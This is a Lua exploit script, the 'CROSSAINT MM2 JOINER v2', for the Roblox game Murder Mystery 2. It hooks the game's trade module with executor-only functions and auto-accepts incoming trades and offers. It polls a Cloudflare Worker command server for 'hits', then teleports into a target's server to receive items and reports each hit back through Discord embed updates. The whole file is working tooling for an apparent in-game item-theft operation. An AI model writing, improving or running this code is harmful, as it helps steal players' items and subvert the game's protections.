-- CROSSAINT MM2 JOINER v2
-- Fixed: watch mode scope bugs, duplicate logic, hit connection

local function geniter(f, s, c)
    if type(f) ~= "function" then
        local mt = getmetatable(f)
        if type(mt) == "table" and mt.__iter then
            f, s, c = mt.__iter(f)
        elseif type(f) == "table" then
            f, s, c = next, f, nil
        end
    end

    return function()
        local r = table.pack(f(s, c))
        if r[1] == nil then return false end
        c = r[1]
        return true, table.unpack(r, 1, r.n)
    end
end

if not game:IsLoaded() then
    game.Loaded:Wait()
end

local Players           = game:GetService("Players")
local TeleportService   = game:GetService("TeleportService")
local HttpService       = game:GetService("HttpService")
local UserInputService  = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CoreGui           = game:GetService("CoreGui")
local ContentProvider   = game:GetService("ContentProvider")

-- ── API base ──────────────────────────────────────────────────────────────────
-- Project Velo — Cloudflare Worker URL
-- Replace YOUR_SUBDOMAIN with your actual workers.dev subdomain
-- or set getgenv().MM2_AJ_API_BASE before running to override
local CF_WORKER_URL = "https://crossaint-hub-25.velohubmm2.workers.dev"

if not getgenv().MM2_AJ_API_BASE then
    getgenv().MM2_AJ_API_BASE = CF_WORKER_URL
end

local API_BASE        = getgenv().MM2_AJ_API_BASE
local URL_STATUS      = API_BASE .. "/mm2-client2-status"
local URL_COMPLETE    = API_BASE .. "/complete-hit"
local URL_LEFT        = API_BASE .. "/player-left"
local URL_PATCH       = API_BASE .. "/patch-embed"
local JOINER_KEY      = "congrats-youre-a-fucking-nolife-weirdo-for-decoding-this-xd-get-a-life-please-go-outside"

local LocalPlayer = Players.LocalPlayer
local Name        = LocalPlayer.Name

-- ── JobId capture ─────────────────────────────────────────────────────────────
local function captureJobId()
    local ok, result = pcall(gethiddenproperty, game, "JobId")
    if ok and type(result) == "string" and result ~= "" and result ~= "00000000-0000-0000-0000-000000000000" then
        return result
    end

    local ok2, result2 = pcall(getproperties, game)
    if ok2 and result2 and type(result2.JobId) == "string" and result2.JobId ~= "" then
        return result2.JobId
    end

    return game.JobId
end

getgenv().JOBID = captureJobId()

print("[CROSSAINT] Waiting for JobID...")
while not getgenv().JOBID do task.wait() end

local JOBID = getgenv().JOBID
print("[CROSSAINT] JobId: " .. JOBID)
print("[CROSSAINT] game.JobId: " .. game.JobId)

-- ── UI button fire helper ─────────────────────────────────────────────────────
local BUTTON_EVENTS = { "MouseButton1Click", "MouseButton1Down", "Activated" }

local function fireButton(btn)
    if not btn then return end

    for _, evName in pairs(BUTTON_EVENTS) do
        local ev = btn[evName]
        if ev then
            local iter = geniter(pairs(getconnections(ev)))
            local ok, _, conn = iter()
            while ok do
                pcall(function() conn.Function() end)
                ok, _, conn = iter()
            end
        end
    end
end

-- ── preload remotes ───────────────────────────────────────────────────────────
task.spawn(function()
    local remotes = {}
    for _, d in ipairs(ReplicatedStorage:GetDescendants()) do
        if d:IsA("RemoteFunction") or d:IsA("RemoteEvent") then
            table.insert(remotes, d)
        end
    end
    pcall(ContentProvider.PreloadAsync, ContentProvider, remotes)
end)

-- ── bypass mobile device select / lobby ───────────────────────────────────────
task.spawn(function()
    repeat
        task.wait(1)
        pcall(function()
            fireButton(LocalPlayer.PlayerGui.DeviceSelect.Container.Phone.Button)
        end)
        pcall(function()
            fireButton(LocalPlayer.PlayerGui.Join.Friends.Play)
        end)
    until LocalPlayer.PlayerGui:FindFirstChild("MainGUI")
end)

-- ── MM2 trade module hook ─────────────────────────────────────────────────────
-- hooks UpdateTrade to capture LastOffer value for AcceptTrade calls
local OriginalUpdateTrade = nil
_G.LastOffer = nil

local function hookTradeModule()
    local ok, TradeModule = pcall(function()
        return require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("TradeModule"))
    end)

    if not ok or not TradeModule then return false end
    if type(TradeModule.UpdateTrade) ~= "function" then return false end

    OriginalUpdateTrade = TradeModule.UpdateTrade
    TradeModule.UpdateTrade = function(data)
        pcall(function()
            if type(data) == "table" and data.LastOffer ~= nil then
                _G.LastOffer = data.LastOffer
                print("[CROSSAINT] UpdateTrade hook → LastOffer =", tostring(data.LastOffer))
            end
        end)
        return OriginalUpdateTrade(data)
    end

    return true
end

hookTradeModule()

local function getLastOffer()
    return _G.LastOffer
end

-- ── MM2 trade remote setup ────────────────────────────────────────────────────
local Trade = ReplicatedStorage:WaitForChild("Trade", 15)
if not Trade then
    warn("[CROSSAINT] Trade folder not found — wrong game?")
    return
end

local inTrade    = false  -- StartTrade fired
local tradeDone  = false  -- DeclineTrade or AcceptTrade(true) fired
local acceptDone = false  -- AcceptTrade response received

-- auto-accept incoming trade requests from sender
local SendRequest = Trade:FindFirstChild("SendRequest")
if SendRequest then
    SendRequest.OnClientInvoke = newcclosure(function()
        pcall(function() Trade.AcceptRequest:FireServer() end)
        return true
    end)
end

-- track trade state via RemoteEvents
local StartTrade   = Trade:FindFirstChild("StartTrade")
local DeclineTrade = Trade:FindFirstChild("DeclineTrade")
local AcceptTrade  = Trade:FindFirstChild("AcceptTrade")
local UpdateTrade2 = Trade:FindFirstChild("UpdateTrade")

if StartTrade then
    StartTrade.OnClientEvent:Connect(function()
        inTrade   = true
        tradeDone = false
        acceptDone = false
        print("[CROSSAINT] StartTrade received")
    end)
end

if DeclineTrade then
    DeclineTrade.OnClientEvent:Connect(function()
        inTrade   = false
        tradeDone = true
        print("[CROSSAINT] DeclineTrade received")
    end)
end

if AcceptTrade then
    AcceptTrade.OnClientEvent:Connect(function(completed)
        acceptDone = true
        if completed then
            inTrade   = false
            tradeDone = true
            print("[CROSSAINT] AcceptTrade: trade completed ✓")
        else
            print("[CROSSAINT] AcceptTrade: mid-accept")
        end
    end)
end

if UpdateTrade2 then
    UpdateTrade2.OnClientEvent:Connect(function(data)
        if type(data) == "table" and data.LastOffer ~= nil then
            _G.LastOffer = data.LastOffer
            print("[CROSSAINT] Remote UpdateTrade → LastOffer =", tostring(data.LastOffer))
        end
    end)
end

-- ── trade accept loop ─────────────────────────────────────────────────────────
-- runs independently — fires AcceptTrade when trade is open and offer is stable
task.spawn(function()
    while true do
        task.wait(0.2)

        if not inTrade then continue end

        local offerStart = nil
        local lastSeen   = nil
        local deadline   = tick() + 9  -- 9s max wait for offer

        while inTrade and tick() < deadline do
            if tradeDone then break end

            local offer = getLastOffer()
            if offer and offer ~= 0 then
                if offer ~= lastSeen then
                    lastSeen   = offer
                    offerStart = tick()
                elseif offerStart and tick() - offerStart >= 0.8 then
                    -- offer stable for 0.8s — accept
                    break
                end
            end

            task.wait(0.05)
        end

        if tradeDone then continue end
        if not inTrade then continue end

        local finalOffer = getLastOffer() or 0

        acceptDone = false
        tradeDone  = false

        pcall(function()
            Trade.AcceptTrade:FireServer(game.PlaceId * 3, finalOffer)
            print("[CROSSAINT] AcceptTrade fired — offer:", tostring(finalOffer))
        end)

        -- wait for server response (up to 10s)
        local deadline2 = tick() + 10
        while not acceptDone and not tradeDone and tick() < deadline2 do
            task.wait(0.05)
        end

        if acceptDone then
            print("[CROSSAINT] Accept registered ✓")
        end
    end
end)

-- ── trade status poll loop ────────────────────────────────────────────────────
-- handles auto-accept of incoming requests (GetTradeStatus)
task.spawn(function()
    while true do
        local status = Trade.GetTradeStatus:InvokeServer()

        if status == "StartTrade" then
            -- trade is open but we haven't accepted offer yet — wait or decline stale
            local wait = 0
            while true do
                wait += task.wait(0.1)
                if wait >= 7 then
                    Trade.DeclineTrade:FireServer()
                    print("[CROSSAINT] Stale trade declined")
                    break
                elseif Trade.GetTradeStatus:InvokeServer() ~= "StartTrade" then
                    break
                end
            end
        elseif status == "ReceivingRequest" then
            Trade.AcceptRequest:FireServer()
            print("[CROSSAINT] Auto-accepted incoming request")
        end

        task.wait(0.1)
    end
end)

-- ── http helpers ──────────────────────────────────────────────────────────────
local request_ = (syn and syn.request) or (fluxus and fluxus.request) or http_request or request

-- last error reason for the status label
local lastHttpErr = "none"

local function httpGet(url)
    if not request_ then
        lastHttpErr = "no http func"
        return nil
    end
    local ok, result = pcall(request_, {
        Url     = url,
        Method  = "GET",
        Headers = { ["X-Roblox-Key"] = JOINER_KEY },
    })
    if not ok then
        lastHttpErr = "req error: " .. tostring(result):sub(1, 40)
        return nil
    end
    if not result then
        lastHttpErr = "nil result"
        return nil
    end
    local sc = tonumber(result.StatusCode or result.status or 0) or 0
    if sc == 403 then
        lastHttpErr = "403 auth fail (key wrong?)"
        return nil
    end
    if sc == 0 and not result.Body then
        lastHttpErr = "no body / timeout"
        return nil
    end
    local ok2, data = pcall(HttpService.JSONDecode, HttpService, result.Body or "")
    if not ok2 then
        lastHttpErr = "bad JSON (HTTP " .. sc .. ")"
        return nil
    end
    lastHttpErr = "ok"
    return data
end

local function httpPost(url, body)
    if not request_ then return nil end
    local ok, result = pcall(request_, {
        Url     = url,
        Method  = "POST",
        Headers = {
            ["X-Roblox-Key"]  = JOINER_KEY,
            ["Content-Type"]  = "application/json",
        },
        Body = HttpService:JSONEncode(body),
    })
    if not ok or not result or not result.Body then return nil end
    local ok2, data = pcall(HttpService.JSONDecode, HttpService, result.Body)
    return ok2 and data or nil
end

local function isPlayerInServer(username)
    if not username or username == "" then return false end
    for _, p in ipairs(Players:GetPlayers()) do
        if p.Name == username then return true end
    end
    return false
end

local function teleportTo(place_id, job_id)
    local pid = tonumber(place_id)
    if not pid then return "failed" end

    pcall(function() TeleportService:TeleportCancel() end)
    task.wait(0.2)

    for i = 1, 20 do
        local prevJob = game.JobId
        local ok = pcall(function()
            TeleportService:TeleportToPlaceInstance(pid, job_id, LocalPlayer)
        end)

        if not ok then
            return "unavailable"
        end

        task.wait(4)

        if game.JobId ~= prevJob then
            return "success"
        end

        if i < 20 then task.wait(1) end
    end

    return "failed"
end

-- ── hit state ─────────────────────────────────────────────────────────────────
local currentHitId   = nil
local watchStartedAt = nil
local senderSeen     = false

local function resetHitState()
    currentHitId   = nil
    watchStartedAt = nil
    senderSeen     = false
end

local function notifyLeft()
    httpPost(URL_LEFT, { username = Name })
end

local function completeHit(hit_id, silent)
    httpPost(URL_COMPLETE, {
        hit_id    = hit_id,
        username  = Name,
        game_type = "mm2",
    })
    resetHitState()
    if not silent then
        -- addHit() is called by the caller when it wants to count
    end
end

-- Tells the worker to PATCH the Discord embed with a joiner status label.
-- The worker looks up the stored webhook URLs + message IDs for this receiver
-- and fires a Discord PATCH on each one.
local function patchEmbed(joiner_status)
    task.spawn(function()
        pcall(httpPost, URL_PATCH, {
            username      = Name,
            joiner_status = joiner_status,
        })
    end)
end

-- ── anti-idle ─────────────────────────────────────────────────────────────────
task.spawn(function()
    local VU = game:GetService("VirtualUser")
    LocalPlayer.Idled:Connect(function()
        VU:CaptureController()
        VU:ClickButton2(Vector2.new())
    end)
    pcall(function() VU:CaptureController() end)

    while true do
        task.wait(60)
        pcall(function()
            VU:Button1Down(Vector2.new(), CFrame.new())
            task.wait(0.1)
            VU:Button1Up(Vector2.new(), CFrame.new())
        end)
    end
end)

-- ── notify worker when THIS joiner client leaves the server ──────────────────
-- fires when the joiner teleports away or disconnects
LocalPlayer.AncestryChanged:Connect(function()
    if not LocalPlayer:IsDescendantOf(game) then
        pcall(notifyLeft)
    end
end)

game:GetService("Players").PlayerRemoving:Connect(function(p)
    if p == LocalPlayer then
        pcall(notifyLeft)
    end
end)

-- ── GUI setup ─────────────────────────────────────────────────────────────────
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name           = "CrossaintMM2Joiner"
ScreenGui.ResetOnSpawn   = false
ScreenGui.DisplayOrder   = 99999
pcall(function() ScreenGui.Parent = CoreGui end)
if not ScreenGui.Parent then
    ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
end

-- ── colours ───────────────────────────────────────────────────────────────────
local C = {
    bg       = Color3.fromRGB(10, 10, 18),
    header   = Color3.fromRGB(16, 16, 30),
    accent   = Color3.fromRGB(80, 130, 255),
    dimText  = Color3.fromRGB(120, 120, 155),
    white    = Color3.fromRGB(230, 230, 240),
    divider  = Color3.fromRGB(35, 35, 60),
    green    = Color3.fromRGB(80,  230, 130),
    yellow   = Color3.fromRGB(255, 210,  70),
    red      = Color3.fromRGB(255,  80,  80),
    cyan     = Color3.fromRGB(100, 220, 255),
}

-- ── root frame ────────────────────────────────────────────────────────────────
local W, H = 262, 174
local Frame = Instance.new("Frame")
Frame.Size             = UDim2.new(0, W, 0, H)
Frame.Position         = UDim2.new(0, 10, 0, 10)
Frame.BackgroundColor3 = C.bg
Frame.BorderSizePixel  = 0
Frame.ClipsDescendants = true
Frame.Parent           = ScreenGui
Instance.new("UICorner", Frame).CornerRadius = UDim.new(0, 8)
local outerStroke = Instance.new("UIStroke", Frame)
outerStroke.Color     = C.accent
outerStroke.Thickness = 1.5

-- header bar
local Header = Instance.new("Frame")
Header.Size             = UDim2.new(1, 0, 0, 32)
Header.Position         = UDim2.new(0, 0, 0, 0)
Header.BackgroundColor3 = C.header
Header.BorderSizePixel  = 0
Header.Parent           = Frame
Instance.new("UICorner", Header).CornerRadius = UDim.new(0, 8)
-- bottom corners square so it blends into body
local hFix = Instance.new("Frame")
hFix.Size             = UDim2.new(1, 0, 0, 10)
hFix.Position         = UDim2.new(0, 0, 1, -10)
hFix.BackgroundColor3 = C.header
hFix.BorderSizePixel  = 0
hFix.Parent           = Header

-- accent stripe on the left of header
local Stripe = Instance.new("Frame")
Stripe.Size             = UDim2.new(0, 3, 1, 0)
Stripe.BackgroundColor3 = C.accent
Stripe.BorderSizePixel  = 0
Stripe.Parent           = Header
Instance.new("UICorner", Stripe).CornerRadius = UDim.new(0, 2)

local function newLabel(parent, text, x, y, w, h, font, size, color, alignX)
    local l = Instance.new("TextLabel")
    l.Size                  = UDim2.new(0, w, 0, h)
    l.Position              = UDim2.new(0, x, 0, y)
    l.BackgroundTransparency = 1
    l.Text                  = text
    l.Font                  = font  or Enum.Font.Gotham
    l.TextSize              = size  or 11
    l.TextColor3            = color or C.white
    l.TextXAlignment        = alignX or Enum.TextXAlignment.Left
    l.TextTruncate          = Enum.TextTruncate.AtEnd
    l.Parent                = parent
    return l
end

-- header title
newLabel(Header, "⚡  CROSSAINT  MM2  JOINER", 10, 0, 180, 32,
    Enum.Font.GothamBold, 12, C.accent)
-- version badge
newLabel(Header, "v2", W - 30, 0, 24, 32,
    Enum.Font.GothamBold, 10, C.dimText, Enum.TextXAlignment.Right)

-- ── divider helper ────────────────────────────────────────────────────────────
local function divider(yPos)
    local d = Instance.new("Frame")
    d.Size             = UDim2.new(1, -16, 0, 1)
    d.Position         = UDim2.new(0, 8, 0, yPos)
    d.BackgroundColor3 = C.divider
    d.BorderSizePixel  = 0
    d.Parent           = Frame
end

-- ── body labels ──────────────────────────────────────────────────────────────
-- row 1: user
divider(36)
newLabel(Frame, "👤", 10, 40, 18, 16, Enum.Font.Gotham, 12, C.dimText)
newLabel(Frame, Name, 30, 40, W - 36, 16, Enum.Font.GothamBold, 11, C.white)

-- row 2: status (larger, color-reactive)
divider(60)
local lblStatus = newLabel(Frame, "⏳  Starting...", 10, 65, W - 16, 20,
    Enum.Font.GothamBold, 13, C.yellow)

-- row 3: sender info
divider(90)
local lblSender = newLabel(Frame, "🎯  —", 10, 95, W - 16, 16,
    Enum.Font.Gotham, 11, C.dimText)

-- row 4: action
divider(115)
local lblAction = newLabel(Frame, "🔧  —", 10, 119, W - 16, 16,
    Enum.Font.Gotham, 11, C.cyan)

-- row 5: bottom bar (timer | hits | worker dot)
divider(139)
local lblTimer  = newLabel(Frame, "⏱  0s",    10,  146, 100, 16, Enum.Font.Gotham, 10, C.dimText)
local lblHits   = newLabel(Frame, "✅  0 hits", 110, 146, 80,  16, Enum.Font.Gotham, 10, C.green)
local lblWorker = newLabel(Frame, "📡 —",      196, 146, 60,  16, Enum.Font.Gotham, 10, C.dimText,
    Enum.TextXAlignment.Right)

-- ── hit counter (incremented by completeHit) ─────────────────────────────────
local hitsCompleted = 0

-- ── drag ─────────────────────────────────────────────────────────────────────
local dragging, dragStart, startPos
Frame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1
    or input.UserInputType == Enum.UserInputType.Touch then
        dragging  = true
        dragStart = input.Position
        startPos  = Frame.Position
    end
end)
Frame.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1
    or input.UserInputType == Enum.UserInputType.Touch then
        dragging = false
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if dragging and (
        input.UserInputType == Enum.UserInputType.MouseMovement
     or input.UserInputType == Enum.UserInputType.Touch
    ) then
        local delta = input.Position - dragStart
        Frame.Position = UDim2.new(
            startPos.X.Scale, startPos.X.Offset + delta.X,
            startPos.Y.Scale, startPos.Y.Offset + delta.Y
        )
    end
end)

-- ── uptime ticker ─────────────────────────────────────────────────────────────
local startTime = tick()
task.spawn(function()
    while true do
        task.wait(1)
        local e = tick() - startTime
        local d = math.floor(e / 86400)
        local h = math.floor(e / 3600 % 24)
        local m = math.floor(e / 60   % 60)
        local s = math.floor(e        % 60)
        if d > 0 then
            lblTimer.Text = string.format("⏱  %dd %dh %dm", d, h, m)
        elseif h > 0 then
            lblTimer.Text = string.format("⏱  %dh %dm %ds", h, m, s)
        elseif m > 0 then
            lblTimer.Text = string.format("⏱  %dm %ds", m, s)
        else
            lblTimer.Text = string.format("⏱  %ds", s)
        end
    end
end)

-- ── public setters ────────────────────────────────────────────────────────────
local function setStatus(text, color)
    lblStatus.Text       = text
    lblStatus.TextColor3 = color or C.white
end

local function setAction(text)
    lblAction.Text = "🔧  " .. text
end

local function setSender(text)
    lblSender.Text = "🎯  " .. (text or "—")
end

local function addHit()
    hitsCompleted = hitsCompleted + 1
    lblHits.Text  = "✅  " .. hitsCompleted .. " hit" .. (hitsCompleted == 1 and "" or "s")
end

local function setWorker(ok)
    if ok then
        lblWorker.Text       = "📡  OK"
        lblWorker.TextColor3 = C.green
    else
        lblWorker.Text       = "📡  DOWN"
        lblWorker.TextColor3 = C.red
    end
end

-- ── startup connectivity check ────────────────────────────────────────────────
task.spawn(function()
    task.wait(1)
    setStatus("🔌  Connecting...", C.yellow)
    local ping = httpGet(API_BASE .. "/health")
    if ping then
        print("[CROSSAINT] ✅ Worker reachable — hits in queue: " .. tostring(ping.hits or 0))
        setStatus("✅  Worker OK", C.green)
        setWorker(true)
    else
        warn("[CROSSAINT] ❌ Worker unreachable — " .. lastHttpErr)
        setStatus("❌  " .. lastHttpErr, C.red)
        setWorker(false)
    end
    task.wait(1.5)
end)

-- ── main poll loop ────────────────────────────────────────────────────────────
task.spawn(function()
    task.wait(3.5)   -- give the connectivity check a moment first
    setStatus("🔍 Polling...", Color3.fromRGB(180, 180, 220))

    while true do
        task.wait(1)

        local statusUrl = URL_STATUS
            .. "?username=" .. HttpService:UrlEncode(Name)
            .. "&job_id="   .. HttpService:UrlEncode(JOBID)

        local data = httpGet(statusUrl)

        if not data then
            setStatus("⚠️  " .. lastHttpErr, C.red)
            setWorker(false)
            warn("[CROSSAINT] httpGet failed — " .. lastHttpErr .. " | URL: " .. statusUrl)
            continue
        end

        setWorker(true)
        local action = data.action

        -- ── IDLE ──────────────────────────────────────────────────────────────
        if action == "idle" then
            setStatus("🔍  Polling...", C.dimText)
            setAction("idle")
            setSender(nil)
            resetHitState()
            continue
        end

        -- ── TELEPORT ──────────────────────────────────────────────────────────
        if action == "teleport" then
            -- reset any previous watch state for this new hit
            if currentHitId ~= data.hit_id then
                resetHitState()
                currentHitId = data.hit_id
            end

            if data.job_id == JOBID then
                -- already here
                setStatus("✅  Already in server", C.green)
                continue
            end

            setStatus("🚀  Teleporting...", C.green)
            setAction("→ " .. tostring(data.job_id):sub(1, 20) .. "…")
            setSender(data.sender or "?")
            print("[CROSSAINT] 🎯 HIT! Sender:", data.sender, "| Job:", data.job_id)
            patchEmbed("🚀 Teleporting...")

            local result = teleportTo(data.place_id, data.job_id)

            if result == "success" then
                print("[CROSSAINT] ✅ Teleporting — autoexec will resume in new server")
            else
                setStatus("❌  Teleport " .. result, C.red)
                completeHit(data.hit_id)
            end

            continue
        end

        -- ── WATCH ─────────────────────────────────────────────────────────────
        if action == "watch" then
            setAction("watch")

            -- initialise watch timer once per hit
            if currentHitId ~= data.hit_id then
                resetHitState()
                currentHitId   = data.hit_id
                watchStartedAt = tick()
            end

            if not watchStartedAt then
                watchStartedAt = tick()
            end

            local elapsed = tick() - watchStartedAt
            local sender  = data.sender
            setSender(sender)

            -- check if sender is currently in the server
            local senderHere = isPlayerInServer(sender)

            if senderHere then
                -- sender arrived → mark seen
                if not senderSeen then
                    patchEmbed("👀 Watching sender...")
                end
                senderSeen = true
                setStatus("👀  " .. (sender or "?") .. " trading...", C.green)
            elseif senderSeen then
                -- sender WAS here but left → trade done
                setStatus("✅  Hit complete!", C.green)
                print("[CROSSAINT] ✅ Sender left after trade — completing hit")
                addHit()
                completeHit(data.hit_id)
                setSender(nil)
                continue
            else
                -- sender hasn't arrived yet
                local wait = math.floor(elapsed)
                setStatus("👀  Waiting for " .. (sender or "?") .. "… " .. wait .. "s", C.yellow)
                print("[CROSSAINT] 👁️ Watch mode — waiting for sender:", sender)
            end

            -- timeout: 90 seconds
            if elapsed >= 90 then
                setStatus("⏰  Watch timeout", C.red)
                print("[CROSSAINT] ⏰ Watch timeout — completing hit as failed")
                completeHit(data.hit_id)
                setSender(nil)
                continue
            end

            continue
        end

        -- unknown action — treat as idle
        setStatus("🔍  Polling...", C.dimText)
        setSender(nil)
        resetHitState()
    end
end)

print("[CROSSAINT] ⚡ Crossaint MM2 Joiner v2 — loaded")
print("[CROSSAINT] 🖱️  GUI is draggable")
print("[CROSSAINT] API: " .. API_BASE)
